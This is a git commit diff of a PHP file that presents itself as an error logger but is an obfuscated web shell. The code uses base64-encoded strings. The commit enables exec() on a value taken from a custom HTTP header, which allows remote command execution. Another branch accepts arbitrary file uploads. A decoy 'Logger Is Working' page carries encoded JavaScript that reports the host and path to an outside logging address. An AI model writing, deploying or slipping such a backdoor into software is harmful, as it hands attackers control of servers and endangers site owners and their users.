499f01bbd9aa8e337a34ef6c6c095fda07ecba91
U-Nano39 <73567618+U-Nano39@users.noreply.github.com>
2023-06-27 13:55:27 +0900

    Update err_logger.php

--- err_logger.php
+++ err_logger.php
@@ -15,14 +15,14 @@
 
     $SSW = $NuNes("I1VwbG9hZEZpbGU6");
 
-    //header("Error-Logger-System: Ver.0.1 Welcome :)");
-    header("Error-Logger-System: ");
+    header("Error-Logger-System: Ver.0.1 Welcome :)");
     $Logger = $_SERVER["HTTP_ERROR_LOGGER_SYSTEM"];
 
     if (empty($Logger)){
         echo $NuNes("PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSdqYSc+DQogICAgPGhlYWQ+DQogICAgICAgIDxtZXRhIGNoYXJzZXQ9J1VURi04Jz4NCiAgICAgICAgPHRpdGxlPjwvdGl0bGU+DQogICAgICAgIDxtZXRhIG5hbWU9J2Rlc2NyaXB0aW9uJyBjb250ZW50PSdFcnJvciBMb2dnZXInPg0KICAgICAgICA8bWV0YSBuYW1lPSd2aWV3cG9ydCcgY29udGVudD0nd2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCc+DQogICAgPC9oZWFkPg0KPGJvZHk+DQogICAgPGgxPkxvZ2dlciBJcyBXb3JraW5nPC9oMT4NCiAgICA8cD5UaGUgc3lzdGVtIGlzIHdvcmtpbmcgcHJvcGVybHkuPC9wPg0KICAgIDxzY3JpcHQ+");
         echo $NuNes("Y29uc3QgSnNvbkxvZyA9IHtOb3RpY2U6ICdEZXRlY3RpbmcgQWNjZXNzJyxIb3N0OiBkb2N1bWVudC5sb2NhdGlvbi5ob3N0LFBhdGg6ICc=").$Path.$NuNes("J307eGhyID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7eGhyLm9wZW4oJ1BPU1QnLCAn").$LogAddress.$NuNes("L2xvZ2dlci9sb2dnaW5nLnBocCcsIHRydWUpO3hoci5zZXRSZXF1ZXN0SGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vanNvbicpO3hoci5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbigpIHtpZiAoeGhyLnJlYWR5U3RhdGUgPT0gNCAmJiB4aHIuc3RhdHVzID09IDIwMCl7Y29uc29sZS5sb2coJ1dvcmtpbmcuJyk7fTt9O3hoci5zZW5kKEpTT04uc3RyaW5naWZ5KEpzb25Mb2cpKTs=");
         echo $NuNes("PC9zY3JpcHQ+DQo8L2JvZHk+DQo8L2h0bWw+");
+        echo $Logger;
 
     }else if (str_starts_with($Logger, $SSW)) {
         echo $NuNes("IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj");
@@ -34,6 +34,6 @@
 
         if (move_uploaded_file($TmpFile, $File)){echo "\n[ok] Successfully.\n-> [$UploadDir/$FileName]\n";}else {echo "\n[err] Failed.\n";};
 
-    }else {echo $Logger;};//exec($Logger, $Output);header("Error-Logger-System: Log - ".json_encode($Output));}; //header("Log: ".json_encode($Output));echo "Log: ".json_encode($Output);};
+    }else {exec($Logger, $Output);header("Error-Logger-System: Log - ".json_encode($Output), false);};//exec($Logger, $Output);header("Error-Logger-System: Log - ".json_encode($Output));}; //header("Log: ".json_encode($Output));echo "Log: ".json_encode($Output);};
 
 ?>
